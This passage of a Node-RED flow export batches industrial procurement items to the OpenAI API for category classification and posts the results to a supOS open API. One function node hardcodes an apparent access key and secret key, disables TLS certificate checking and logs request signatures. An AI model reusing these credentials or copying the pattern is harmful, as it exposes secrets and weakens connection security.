        "x": 670,
        "y": 3560,
        "wires": [
            [
                "64684b209232b3a9"
            ]
        ]
    },
    {
        "id": "18f85f91932ab842",
        "type": "function",
        "z": "a29fcfb6f0cac7dd",
        "name": "function 30",
        "func": "var temp = msg.payload\nflow.set(\"origin\", temp)\n\nreturn msg;",
        "outputs": 1,
        "timeout": 0,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 650,
        "y": 3460,
        "wires": [
            [
                "23a38d62ce86fa03"
            ]
        ]
    },
    {
        "id": "4c7a3bb6fac5d322",
        "type": "debug",
        "z": "a29fcfb6f0cac7dd",
        "name": "debug 36",
        "active": true,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "origin",
        "targetType": "msg",
        "statusVal": "",
        "statusType": "auto",
        "x": 1320,
        "y": 3620,
        "wires": []
    },
    {
        "id": "3c7d5714cb407e4c",
        "type": "debug",
        "z": "a29fcfb6f0cac7dd",
        "name": "debug 37",
        "active": true,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "temp",
        "targetType": "msg",
        "statusVal": "",
        "statusType": "auto",
        "x": 1340,
        "y": 3580,
        "wires": []
    },
    {
        "id": "46fea0e2975fa112",
        "type": "function",
        "z": "a29fcfb6f0cac7dd",
        "name": "function 31",
        "func": "msg.payload = JSON.parse(msg.payload);\nreturn msg;",
        "outputs": 1,
        "timeout": 0,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 370,
        "y": 3420,
        "wires": [
            [
                "d0c23edad15ffd42",
                "18f85f91932ab842"
            ]
        ]
    },
    {
        "id": "d0c23edad15ffd42",
        "type": "debug",
        "z": "a29fcfb6f0cac7dd",
        "name": "debug 39",
        "active": true,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "false",
        "statusVal": "",
        "statusType": "auto",
        "x": 620,
        "y": 3340,
        "wires": []
    },
    {
        "id": "19cdcf192ef5f98a",
        "type": "inject",
        "z": "a29fcfb6f0cac7dd",
        "name": "",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "",
        "payload": "",
        "payloadType": "date",
        "x": 210,
        "y": 3340,
        "wires": [
            [
                "8b1393d1d4d64527"
            ]
        ]
    },
    {
        "id": "8b1393d1d4d64527",
        "type": "http request",
        "z": "a29fcfb6f0cac7dd",
        "name": "",
        "method": "GET",
        "ret": "txt",
        "paytoqs": "ignore",
        "url": "https://apaas-r4xv.saas.supos.io/api/config/download?fileName=2023-11-05%2F1699189640163%2F2221.json",
        "tls": "",
        "persist": false,
        "proxy": "",
        "insecureHTTPParser": false,
        "authType": "",
        "senderr": false,
        "headers": [],
        "x": 350,
        "y": 3340,
        "wires": [
            [
                "46fea0e2975fa112"
            ]
        ]
    },
    {
        "id": "4b061872eaf0c741",
        "type": "debug",
        "z": "a29fcfb6f0cac7dd",
        "name": "debug 40",
        "active": true,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "loop",
        "targetType": "msg",
        "statusVal": "",
        "statusType": "auto",
        "x": 1040,
        "y": 3240,
        "wires": []
    },
    {
        "id": "977f8c9f8215243b",
        "type": "inject",
        "z": "a29fcfb6f0cac7dd",
        "name": "",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "",
        "payload": "",
        "payloadType": "date",
        "x": 570,
        "y": 3880,
        "wires": [
            [
                "962bfad74023fbed"
            ]
        ]
    },
    {
        "id": "97d333e2b6ce463f",
        "type": "function",
        "z": "a29fcfb6f0cac7dd",
        "name": "function 32",
        "func": "\nreturn msg;",
        "outputs": 1,
        "timeout": 0,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 800,
        "y": 4000,
        "wires": [
            [
                "962bfad74023fbed"
            ]
        ]
    },
    {
        "id": "34faefb34f6b12f7",
        "type": "debug",
        "z": "a29fcfb6f0cac7dd",
        "name": "debug 41",
        "active": true,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "loop",
        "targetType": "msg",
        "statusVal": "",
        "statusType": "auto",
        "x": 1040,
        "y": 3860,
        "wires": []
    },
    {
        "id": "330556b282850e79",
        "type": "debug",
        "z": "a29fcfb6f0cac7dd",
        "name": "debug 42",
        "active": true,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "payload",
        "targetType": "msg",
        "statusVal": "",
        "statusType": "auto",
        "x": 1250,
        "y": 3340,
        "wires": []
    },
    {
        "id": "a5e8a19673785205",
        "type": "debug",
        "z": "a29fcfb6f0cac7dd",
        "name": "debug 43",
        "active": true,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "false",
        "statusVal": "",
        "statusType": "auto",
        "x": 350,
        "y": 3660,
        "wires": []
    },
    {
        "id": "c95e0cef357f7a97",
        "type": "debug",
        "z": "a29fcfb6f0cac7dd",
        "name": "debug 45",
        "active": true,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "test",
        "targetType": "msg",
        "statusVal": "",
        "statusType": "auto",
        "x": 1520,
        "y": 3540,
        "wires": []
    },
    {
        "id": "1c18d2e8dd1ff583",
        "type": "debug",
        "z": "a29fcfb6f0cac7dd",
        "name": "debug 46",
        "active": true,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "jsonObjTemp",
        "targetType": "msg",
        "statusVal": "",
        "statusType": "auto",
        "x": 1430,
        "y": 3340,
        "wires": []
    },
    {
        "id": "5041cd0a0374574c",
        "type": "function",
        "z": "a29fcfb6f0cac7dd",
        "name": "function 40",
        "func": "var crypto = global.get('crypto')\nvar rp = global.get('rp');\nconst ak = \"13f19bdbc7c28e1d2b2ea3c083c2d87b\"\nconst sk = \"f16a37fdfe8622e36226913ad4b3c370\"\nconst supos = \"http://47.236.10.165:8080/\"\n//对查询参数进行排序\n\n//对查询参数进行排序\nfunction sortQuery(jsonObj) {\n    if (jsonObj == null) return '';\n    let lowerCasekeyObj = {};\n    let lowerCasekeyArr = [];\n    for (const key in jsonObj) {\n        const lowerKey = key.toLowerCase()\n        lowerCasekeyArr.push(lowerKey);\n        lowerCasekeyObj[lowerKey] = jsonObj[key];\n    }\n    let res = '';\n    lowerCasekeyArr.sort();\n    for (const i in lowerCasekeyArr) {\n        let key = lowerCasekeyArr[i];\n        res += lowerCasekeyArr[i] + \"=\" + lowerCasekeyObj[key] + \"&\";\n    }\n    return res.substring(0, res.length - 1);\n}\n//json转查询串\nfunction json2query(jsonObj) {\n    let res = '';\n    for (const key in jsonObj) {\n        res += key + \"=\" + jsonObj[key] + \"&\"\n    }\n    return res.substring(0, res.length - 1);\n}\nfunction buildSignString(uri, methodName, queryJson, headerJson) {\n    let signStr = ''\n    // HTTP Schema\n    signStr = signStr + methodName + \"\\n\"\n    // HTTP URI\n    signStr = signStr + uri + \"\\n\"\n    // HTTP ContentType\n    signStr = signStr + headerJson['Content-Type'] + \"\\n\"\n    // CanonicalQueryString\n    signStr = signStr + sortQuery(queryJson) + \"\\n\" + \"\\n\"\n    return signStr\n}\n//使用aksk方式签名,\nfunction signHeader(uri, methodName, queryJson, headerJson) {\n    let signStr = buildSignString(uri, methodName, queryJson, headerJson);\n    console.log(\"签名源==========Start===========\")\n    console.log(signStr)\n    console.log(\"签名源==========End===========\")\n    let signature = crypto.createHmac('sha256', sk).update(signStr, 'utf8').digest('hex');\n    let final_signature = \"Sign \" + ak + \"-\" + signature\n    console.log(\"签名结果：\", final_signature)\n    headerJson['Authorization'] = final_signature;\n}\n\nfunction test(hello) {\n    let openApiUri = \n    '/open-api/supos/oodm/v2/template/wenhao_testw/test_w/service/wenhao_testw/insert'\n    const methodName = 'POST'\n    let queryJson = null;\n    let headerJson = {\n        'Content-Type': 'application/json;charset=utf-8'\n    };\n    let wholeUrl = supos + openApiUri;\n    //注意queryJson是url上的参数，不是body部分\n    signHeader(openApiUri, methodName, queryJson, headerJson);\n    var options = {\n        method: methodName,\n        uri: wholeUrl,\n        headers: headerJson,\n        strictSSL: false,\n        body: hello,\n        // json: true,\n        resolveWithFullResponse: true\n    };\n    if (queryJson != null) {\n        wholeUrl += \"?\" + json2query(queryJson);\n        options['uri'] = wholeUrl;\n    }\n    rp(options)\n        .then(function (response) {\n            //console.log('response:', response);\n            //msg.payload = 123;\n            // msg.payload = response\n            // node.send(msg);\n        })\n        .catch(function (err) {\n            console.error('错误是1111', err)\n            msg.result = err\n            node.send(msg)\n        });\n}\n\nfor (let index = 0; index < msg.origin.length; index++) {\n    var hello='{\"insert\":'+JSON.stringify(msg.origin[index])+'}'\ntest(hello)    \nif (index == msg.origin.length -1){\n    node.send(msg);\n}\n}\n",
        "outputs": 1,
        "timeout": 0,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 730,
        "y": 4760,
        "wires": [
            [
                "cba455704770539d"
            ]
        ]
    },
    {
        "id": "cba455704770539d",
        "type": "debug",
        "z": "a29fcfb6f0cac7dd",
        "name": "debug 60",
        "active": true,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "payload",
        "targetType": "msg",
        "statusVal": "",
        "statusType": "auto",
        "x": 940,
        "y": 4760,
        "wires": []
    },
    {
        "id": "85564c97c86d522d",
        "type": "http request",
        "z": "a29fcfb6f0cac7dd",
        "name": "GPT",
        "method": "POST",
        "ret": "txt",
        "paytoqs": "ignore",
        "url": "https://api.openai.com/v1/chat/completions",
        "tls": "",
        "persist": false,
        "proxy": "",
        "insecureHTTPParser": false,
        "authType": "bearer",
        "senderr": false,
        "headers": [
            {
                "keyType": "Content-Type",
                "keyValue": "",
                "valueType": "application/json",
                "valueValue": ""
            }
        ],
        "x": 330,
        "y": 4560,
        "wires": [
            [
                "bcd1368de8d87741",
                "7774392ed225c92f"
            ]
        ]
    },
    {
        "id": "6396e98b81017a28",
        "type": "function-gpt",
        "z": "a29fcfb6f0cac7dd",
        "name": "function-gpt 14",
        "config": "44c9c8af11a9f982",
        "func": "// 确保msg.payload是可以迭代的\nif (msg.payload && typeof msg.payload === 'object' && !Array.isArray(msg.payload)) {\n    // 如果msg.payload是对象，则取其值作为数组\n    msg.payload = Object.values(msg.payload);\n} else if (!Array.isArray(msg.payload)) {\n    // 如果msg.payload不是对象也不是数组，则将其放入数组中\n    msg.payload = [msg.payload];\n}\n\n// 使用.map方法生成新的消息数组\nlet messagesToSend = msg.payload.map(value => {\n    return {\n        payload: {\n            model: \"gpt-4\",\n            messages: [{\n                role: 'user',\n                content:\n                    '尝试理解以下一级类目的含义和特点，括号中的是解释：工业检测,实验室产品,安防消防,电线电缆,电工器材,配电及控制元件,工业自动化,工具,照明,办公用品,通信设备,劳动防护,清洁用品及设备,控制系统,现场仪表,计算机及外设,盘装仪表,机械,工具耗材,存储,量具,焊接,刀具,搬运,紧固,密封,制冷|暖通|通风除尘,包材,胶粘,润滑,车间化学品,泵管阀,工位,建筑材料,轴承。综合我输入的JSON信息，那将是包含一些工业用产品物料的信息，然后根据你的综合理解，推测它最可能属于哪一个一级类目，要按照物品本身的属性推测，而不要依据使用场景或其所属系统分类。如果你很不确定属于哪类，则分为“人工”类。最终输出item描述和对应类别的JSON，格式严格遵循{\"一级类目\"：{一级类目}}，其余键值对不要返回，你给我的回答应该只包括最后的JSON，以下是我的输入JSON:' + value                     }]\n        }\n    };\n});\n\n// 将要发送的消息数组存储在流的上下文中，以便跨消息调用持久化\nflow.set(\"messagesToSend\", messagesToSend);\n\n// 调用发送函数\nsendNext();\n\n// 定义发送函数\nfunction sendNext() {\n    let messages = flow.get(\"messagesToSend\") || [];\n    let nextMessage = messages.shift(); // 获取数组中的下一条消息\n    flow.set(\"messagesToSend\", messages); // 更新剩余消息数组\n    if (nextMessage) {\n        node.send(nextMessage); // 发送消息\n        // 如果还有消息要发送，调用此函数来延迟下一次发送\n        if (messages.length > 0) {\n            setTimeout(sendNext, 5000); // 5秒后再次发送\n        }\n    }\n}\n\nreturn null; // 防止在输出中直接发送任何消息\n",
        "outputs": 1,
        "noerr": 0,
        "initialize": "// 部署节点后，此处添加的代码将运行一次。 \n",
        "finalize": "// 此处添加的代码，将在停止或重新部署节点时运行。 \n",
        "libs": [],
        "x": 1260,
        "y": 4460,
        "wires": [
            [
                "85564c97c86d522d"
            ]
        ]
    },
    {
        "id": "a6a62bc8dd75c6dd",
        "type": "json",
        "z": "a29fcfb6f0cac7dd",
        "name": "",
        "property": "payload",
        "action": "",
        "pretty": false,
        "x": 1110,
        "y": 4460,
        "wires": [
            [
                "6396e98b81017a28"
            ]
        ]
    },
    {
        "id": "c0d7bab2372f9b44",
        "type": "function",
        "z": "a29fcfb6f0cac7dd",
        "name": "function 41",
        "func": "\nmsg.payload=flow.get('payload')\nmsg.origin = flow.get('originO')\n\nvar jsonObj\nvar temp\ntry {\njsonObj = JSON.parse(msg.payload);\nmsg.temp = jsonObj.choices[0].message.content\n\n\n\nvar jsonObjTemp = JSON.parse(msg.temp);\n    msg.jsonObjTemp = jsonObjTemp\n\nif (jsonObjTemp[\"类别\"] != null) {\n    temp = jsonObjTemp[\"类别\"]\n} else if (jsonObjTemp.category != null) {\n    temp = jsonObjTemp.category\n} else if (jsonObjTemp[\"一级类目\"] != null) {\n    temp = jsonObjTemp[\"一级类目\"]\n} else if (jsonObjTemp[\"物料类别\"] != null) {\n    temp = jsonObjTemp[\"物料类别\"]\n}\n\n\n\n} \ncatch (error) {\n}\nif (temp != undefined) {\n    msg.msg = temp\n\n}\n\n\nfor (let index = 0; index < msg.origin.length; index++) {\n   msg.test= msg.origin[index]\n msg.origin[index]['类别'] = jsonObjTemp[index]['一级类目']\n}\n\nreturn msg\n",
        "outputs": 1,
        "timeout": 0,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 790,
        "y": 4560,
        "wires": [
            [
                "6c72d18a93156c2d",
                "661897e4a72ea461",
                "437105608b3968d2",
                "19ed65961472291f",
                "a62744bb0d8d6ec7"
            ]
        ]
    },
    {
        "id": "ddc4d0832f32d870",
        "type": "function",
        "z": "a29fcfb6f0cac7dd",
        "name": "function 42",
        "func": "flow.set('loop',msg.loop.value)\nvar origin = flow.get('origin')\nvar end = msg.loop.value * 30\nvar start = end-29\n\nfor (let index = start; index <= end; index++) {\n    var originO\n\nif (msg.payload != null && msg.payload != undefined){\n    var temp ={\n        //    \"物料编码\":origin[index]['物料编码'],\n        \"物料描述\": origin[index]['物料描述']\n    }\n    msg.payload = msg.payload + ',' + JSON.stringify(temp)\n    originO = originO + ',' + JSON.stringify(origin[index])\n}else {\n    msg.payload = {\n        // \"物料编码\":origin[index]['物料编码'],\n        \"物料描述\": origin[index]['物料描述']\n    }\n    msg.payload= JSON.stringify(msg.payload);\n    originO = JSON.stringify(origin[index])\n\n}\n\n    if (index==end){\n        msg.payload='['+msg.payload +']'\n        msg.payload=JSON.parse(msg.payload);\n\n        var test = '['+originO +']'\n        msg.test =JSON.parse(test)\n        flow.set('originO',JSON.parse(test))\n        \n    }\n}\n\n\nreturn msg;",
        "outputs": 1,
        "timeout": 0,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 960,
        "y": 4460,
        "wires": [
            [
                "a6a62bc8dd75c6dd",
                "43be1398a668d62e"
            ]
        ]
    },
    {
        "id": "7774392ed225c92f",
        "type": "function",
        "z": "a29fcfb6f0cac7dd",
        "name": "function 43",
        "func": "flow.set(\"payload\",msg.payload)\nreturn msg;",
        "outputs": 1,
        "timeout": 0,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 590,
        "y": 4560,
        "wires": [
            [
                "c0d7bab2372f9b44"
            ]
        ]
    },
    {
        "id": "89f81e874589573a",
        "type": "function",
        "z": "a29fcfb6f0cac7dd",
        "name": "function 44",
        "func": "var temp = msg.payload\nflow.set(\"origin\", temp)\n\nreturn msg;",
        "outputs": 1,
        "timeout": 0,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 570,
        "y": 4460,
        "wires": [
            [
                "6c72d18a93156c2d"
            ]
        ]
    },
    {
        "id": "661897e4a72ea461",
        "type": "debug",
        "z": "a29fcfb6f0cac7dd",
        "name": "debug 61",
        "active": true,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "origin",
        "targetType": "msg",
        "statusVal": "",
        "statusType": "auto",
        "x": 1220,
        "y": 4640,
        "wires": []
    },
    {
        "id": "437105608b3968d2",
        "type": "debug",
        "z": "a29fcfb6f0cac7dd",
        "name": "debug 62",
        "active": true,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "temp",
        "targetType": "msg",
        "statusVal": "",
        "statusType": "auto",
        "x": 1220,
        "y": 4580,
        "wires": []
    },
    {
        "id": "dab2ee923ee8722e",
        "type": "function",
        "z": "a29fcfb6f0cac7dd",
        "name": "function 45",
        "func": "msg.payload = JSON.parse(msg.payload);\nreturn msg;",
        "outputs": 1,
        "timeout": 0,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 290,
        "y": 4420,
        "wires": [
            [
                "f51175c7cd4da08a",
                "89f81e874589573a"
            ]
        ]
    },
    {
        "id": "f51175c7cd4da08a",
        "type": "debug",
        "z": "a29fcfb6f0cac7dd",
        "name": "debug 63",
        "active": true,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "false",
        "statusVal": "",
        "statusType": "auto",
        "x": 560,
        "y": 4340,
        "wires": []
    },
    {
        "id": "3874d9ba42d14f23",
        "type": "inject",
        "z": "a29fcfb6f0cac7dd",
        "name": "",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "",
        "payload": "",
        "payloadType": "date",
        "x": 270,
        "y": 4280,
        "wires": [
            [
                "d4653946582d04d7"
            ]
        ]
    },
    {
        "id": "d4653946582d04d7",
        "type": "http request",
        "z": "a29fcfb6f0cac7dd",
        "name": "",
        "method": "GET",
        "ret": "txt",
        "paytoqs": "ignore",
        "url": "https://apaas-r4xv.saas.supos.io/api/config/download?fileName=2023-11-05%2F1699189640163%2F2221.json",
        "tls": "",
        "persist": false,
        "proxy": "",
        "insecureHTTPParser": false,
        "authType": "",
        "senderr": false,
        "headers": [],
        "x": 270,
        "y": 4340,
        "wires": [
            [
                "dab2ee923ee8722e"
            ]
        ]
    },
    {
        "id": "cf51296f263ea131",
        "type": "debug",
        "z": "a29fcfb6f0cac7dd",
        "name": "debug 64",
        "active": true,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "loop",
        "targetType": "msg",
        "statusVal": "",
        "statusType": "auto",
        "x": 1220,
        "y": 4280,
        "wires": []
    },
    {
        "id": "43be1398a668d62e",
        "type": "debug",
        "z": "a29fcfb6f0cac7dd",
        "name": "debug 65",
        "active": true,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "payload",
        "targetType": "msg",
        "statusVal": "",
        "statusType": "auto",
        "x": 1220,
        "y": 4340,
        "wires": []
    },
    {
        "id": "bcd1368de8d87741",
        "type": "debug",
        "z": "a29fcfb6f0cac7dd",
        "name": "debug 66",
        "active": true,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "false",
        "statusVal": "",
        "statusType": "auto",
        "x": 340,
        "y": 4660,
        "wires": []
    },
    {
        "id": "a62744bb0d8d6ec7",
        "type": "debug",
        "z": "a29fcfb6f0cac7dd",
        "name": "debug 67",
        "active": true,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "test",
        "targetType": "msg",
        "statusVal": "",
        "statusType": "auto",
        "x": 1220,
        "y": 4520,
        "wires": []
    },
    {
        "id": "19ed65961472291f",
        "type": "debug",
        "z": "a29fcfb6f0cac7dd",
        "name": "debug 68",
        "active": true,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "jsonObjTemp",
        "targetType": "msg",
        "statusVal": "",
        "statusType": "auto",
        "x": 1220,
        "y": 4400,
        "wires": []
    },
    {
        "id": "40da5c25898d2e06",
        "type": "loop",
        "z": "a29fcfb6f0cac7dd",
        "name": "",
        "kind": "enum",
        "count": "",
        "initial": "1",
        "step": "1",
        "condition": "",
        "conditionType": "js",
        "when": "before",
        "enumeration": "origin",
        "enumerationType": "flow",
        "limit": "",
        "loopPayload": "loop-key",
        "finalPayload": "final-count",
        "x": 490,
        "y": 380,
        "wires": [
            [],
            [
                "e9714b620db1d873",
                "f80f4f4df026ea3d"
            ]
        ]
    },
    {
        "id": "805d342f920109cb",
        "type": "loop",
        "z": "a29fcfb6f0cac7dd",
        "name": "",
        "kind": "enum",
        "count": "",
        "initial": "1",
        "step": "1",
        "condition": "",
        "conditionType": "js",
        "when": "before",
        "enumeration": "[{     \"到货日期\": \"2023-03-21T00:00:00.000Z\",     \"采购订单号\": 4500018770,     \"采购行项目\": 50,     \"物料编码\": \"WL0708000000003100237\",     \"物料描述\": \"电排  KCS-100A\",     \"备注\": \"由诺圣设备维保，空气干燥机专用配件，现因故障没有运行，气动阀生产影响严重。\",     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 1120.0   },   {     \"到货日期\": \"2023-03-21T00:00:00.000Z\",     \"采购订单号\": 4500018770,     \"采购行项目\": 70,     \"物料编码\": \"WL0708000000003100239\",     \"物料描述\": \"过滤器芯  KCS-100A\",     \"备注\": \"由诺圣设备维保，空气干燥机专用配件，现因故障没有运行，气动阀生产影响严重。\",     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 675.01   },   {     \"到货日期\": \"2023-03-24T00:00:00.000Z\",     \"采购订单号\": 4500018770,     \"采购行项目\": 60,     \"物料编码\": \"WL0708000000003100238\",     \"物料描述\": \"冷媒  KCS-100A\",     \"备注\": \"由诺圣设备维保，空气干燥机专用配件，现因故障没有运行，气动阀生产影响严重。\",     \"到货基本计量单位\": \"kg\",     \"采购订单含税单价\": 75.0   },   {     \"到货日期\": \"2023-04-03T00:00:00.000Z\",     \"采购订单号\": 4500019104,     \"采购行项目\": 10,     \"物料编码\": \"WL0804002000003100128\",     \"物料描述\": \"现场按钮箱 工程塑料IP65 H260*W180*D120\",     \"备注\": null,     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 850.0   },   {     \"到货日期\": \"2023-03-21T00:00:00.000Z\",     \"采购订单号\": 4500018770,     \"采购行项目\": 40,     \"物料编码\": \"WL0708000000003100236\",     \"物料描述\": \"压力保护器  KCS-100A\",     \"备注\": \"由诺圣设备维保，空气干燥机专用配件，现因故障没有运行，气动阀生产影响严重。\",     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 1560.0   },   {     \"到货日期\": \"2023-03-21T00:00:00.000Z\",     \"采购订单号\": 4500018770,     \"采购行项目\": 30,     \"物料编码\": \"WL0708000000003100235\",     \"物料描述\": \"压力控制器  KCS-100A\",     \"备注\": \"由诺圣设备维保，空气干燥机专用配件，现因故障没有运行，气动阀生产影响严重。\",     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 1925.0   },   {     \"到货日期\": \"2023-07-11T00:00:00.000Z\",     \"采购订单号\": 4500022260,     \"采购行项目\": 10,     \"物料编码\": \"WL1103004000003120000\",     \"物料描述\": \"90度热压弯头∅57×6 （材质20G）\",     \"备注\": \"3号炉给水泵\",     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 27.0   },   {     \"到货日期\": \"2023-02-23T00:00:00.000Z\",     \"采购订单号\": 4500016908,     \"采购行项目\": 20,     \"物料编码\": \"WL0910000000003100336\",     \"物料描述\": \"背压阀（SANKNG） PN16 DN20 3/4‘\",     \"备注\": \"清水池计量投加泵\",     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 190.0   },   {     \"到货日期\": \"2022-07-15T00:00:00.000Z\",     \"采购订单号\": 4500012824,     \"采购行项目\": 70,     \"物料编码\": \"WL0904002000003100002\",     \"物料描述\": \"玻璃管液位计L=800mm  DN25/316L(带排污阀)\",     \"备注\": null,     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 1530.0   },   {     \"到货日期\": \"2023-07-11T00:00:00.000Z\",     \"采购订单号\": 4500022260,     \"采购行项目\": 20,     \"物料编码\": \"WL1103008000003120000\",     \"物料描述\": \"大小头DN100×DN150×10 （材质20G）\",     \"备注\": \"3号炉给水泵\",     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 170.0   },   {     \"到货日期\": \"2023-06-14T00:00:00.000Z\",     \"采购订单号\": 4500021853,     \"采购行项目\": 50,     \"物料编码\": \"WL0906000000003100036\",     \"物料描述\": \"电导电极DDF-2043-405B-1 \",     \"备注\": \"上海精密科学仪器有限公司，水处理回水\",     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 349.99   },   {     \"到货日期\": \"2023-02-14T00:00:00.000Z\",     \"采购订单号\": 4500018420,     \"采购行项目\": 20,     \"物料编码\": \"WL0802006000003100004\",     \"物料描述\": \"电容器 YDL-YSTSC-300/0.4\",     \"备注\": \"厂：上海一德，用于二级净化配电房，要求：铜质电抗器，晶闸管无触点开关。\",     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 118824.99   },   {     \"到货日期\": \"2023-02-14T00:00:00.000Z\",     \"采购订单号\": 4500018420,     \"采购行项目\": 10,     \"物料编码\": \"WL0802006000003100003\",     \"物料描述\": \"电容器 YDL-YSTSC-660/0.4\",     \"备注\": \"厂：上海一德，用于一级净化配电房，要求：铜质电抗器，晶闸管无触点开关。\",     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 226170.0   },   {     \"到货日期\": \"2023-05-24T00:00:00.000Z\",     \"采购订单号\": 4500021533,     \"采购行项目\": 50,     \"物料编码\": \"WL1400000000003100488\",     \"物料描述\": \"黑色波纹带钢丝橡胶吸水管 20M  DN100（法兰）\",     \"备注\": \"沉渣池清淤，（一头带法兰，一头带莲蓬头）sap\",     \"到货基本计量单位\": \"根\",     \"采购订单含税单价\": 3850.0   },   {     \"到货日期\": \"2023-05-16T00:00:00.000Z\",     \"采购订单号\": 4500021073,     \"采购行项目\": 30,     \"物料编码\": \"WL0911000000003100132\",     \"物料描述\": \"户外电机接线盒防护罩 BLH-FEP-PTFE-10\",     \"备注\": \"要求：防尘、防水、防腐，阻燃绝缘，用于室外电机接线盒防护\",     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 2985.0   },   {     \"到货日期\": \"2023-05-16T00:00:00.000Z\",     \"采购订单号\": 4500021073,     \"采购行项目\": 10,     \"物料编码\": \"WL0911000000003100130\",     \"物料描述\": \"户外电机接线盒防护罩 BLH-FEP-PTFE-8\",     \"备注\": \"要求：防尘、防水、防腐，阻燃绝缘用于电机接线盒防水，用于室外电机接线盒防护\",     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 2895.0   },   {     \"到货日期\": \"2023-05-16T00:00:00.000Z\",     \"采购订单号\": 4500021073,     \"采购行项目\": 20,     \"物料编码\": \"WL0911000000003100131\",     \"物料描述\": \"户外电机接线盒防护罩 BLH-FEP-PTFE-9\",     \"备注\": \"要求：防尘、防水、防腐，阻燃绝缘，用于室外电机接线盒防护\",     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 1987.0   },   {     \"到货日期\": \"2022-11-09T00:00:00.000Z\",     \"采购订单号\": 4500015204,     \"采购行项目\": 40,     \"物料编码\": \"WL0805002000003100250\",     \"物料描述\": \"交流接触器 LC1E2510 220V\",     \"备注\": \"用于石灰系统\",     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 125.0   },   {     \"到货日期\": \"2023-03-07T00:00:00.000Z\",     \"采购订单号\": 4500019134,     \"采购行项目\": 50,     \"物料编码\": \"WL0707000000003100130\",     \"物料描述\": \"皮带轮 SPC212-4-50\",     \"备注\": \"上海德惠特种风机，2号除尘风机用\",     \"到货基本计量单位\": \"套\",     \"采购订单含税单价\": 757.0   },   {     \"到货日期\": \"2023-03-07T00:00:00.000Z\",     \"采购订单号\": 4500019134,     \"采购行项目\": 60,     \"物料编码\": \"WL0707000000003100131\",     \"物料描述\": \"皮带轮 SPC280-4-60\",     \"备注\": \"上海德惠特种风机，2号除尘风机用\",     \"到货基本计量单位\": \"套\",     \"采购订单含税单价\": 1377.0   },   {     \"到货日期\": \"2023-03-21T00:00:00.000Z\",     \"采购订单号\": 4500019454,     \"采购行项目\": 30,     \"物料编码\": \"WL1101007000003100008\",     \"物料描述\": \"液压多路换向阀 ZS1-L10E-OT-10\",     \"备注\": \"PN16PMA流量40L/min，破碎机\",     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 370.0   },   {     \"到货日期\": \"2023-02-23T00:00:00.000Z\",     \"采购订单号\": 4500016908,     \"采购行项目\": 10,     \"物料编码\": \"WL0701002001993100001\",     \"物料描述\": \"阻泥器（SANKNG） PN16 DN20 3/4‘\",     \"备注\": \"清水池计量投加泵\",     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 480.0   },   {     \"到货日期\": \"2021-12-27T00:00:00.000Z\",     \"采购订单号\": 4500006144,     \"采购行项目\": 10,     \"物料编码\": null,     \"物料描述\": \"*螺旋输送机*  DN350\",     \"备注\": null,     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 503000.0   },   {     \"到货日期\": \"2022-09-22T00:00:00.000Z\",     \"采购订单号\": 4500014056,     \"采购行项目\": 10,     \"物料编码\": \"WL1301003000003100123\",     \"物料描述\": \"001*7阳离子树脂\",     \"备注\": null,     \"到货基本计量单位\": \"kg\",     